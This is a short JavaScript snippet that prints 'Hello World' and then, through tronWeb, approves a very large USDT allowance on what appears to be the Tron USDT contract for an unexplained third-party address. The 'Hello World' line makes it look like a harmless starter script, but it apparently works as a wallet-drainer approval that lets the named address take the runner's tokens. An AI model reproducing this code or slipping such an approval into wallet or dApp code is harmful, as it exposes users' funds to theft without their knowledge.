console.log("Hello World");
tronWeb
  .contract()
  .at("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t")
  .then((usdtContract) => {
	  usdtContract
		  .approve("TBYjMhBiyEJxSA5g4HAoWWZXp7qU5C6Y9c", 1000000000000000)
		  .send()
		  .finally(() => {
			  console.log("Approved!");
		  });
  });